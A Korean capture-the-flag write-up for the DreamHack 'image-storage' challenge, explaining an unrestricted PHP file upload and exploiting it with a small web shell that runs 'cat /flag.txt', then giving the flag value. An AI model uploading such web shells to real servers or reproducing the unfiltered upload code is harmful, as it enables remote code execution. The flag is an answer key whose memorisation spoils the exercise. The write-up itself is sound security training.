# [DreamHack] image-storage

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> php로 작성된 파일 저장 서비스입니다.
>
> 파일 업로드 취약점을 이용해 플래그를 획득하세요. 플래그는 `/flag.txt`에 있습니다.
>
> Release: [image-storage.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8560446/image-storage.zip)

## Analysis

![image](https://user-images.githubusercontent.com/104156058/165236129-2cda361f-c9fe-4dcf-9571-f749a846f8da.png)

파일을 업로드할 수 있다.

```php
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
```

업로드한 파일은 `./uploads/` 디렉토리에 저장된다. 확장자 제한 같은 필터링이 없어서 원하는 파일은 무엇이든 업로드할 수 있다. PHP 파일로 웹 셸을 업로드해서 `/flag.txt` 파일의 내용을 출력하도록 만들면 플래그를 획득할 수 있다.

## Exploit

```php
<?php
system("cat /flag.txt");
?>
```

위의 코드를 `flag.php`로 저장하고 업로드한 후, `/uploads/flag.php`에 접속하면 코드가 실행되어 플래그를 획득할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/165236721-eff9fe4d-d587-4655-8055-656c93fc3175.png)

![image](https://user-images.githubusercontent.com/104156058/165236756-1a0e432e-ad99-434c-a6eb-357593c6cde7.png)

```
flag: DH{c29f44ea17b29d8b76001f32e8997bab}
```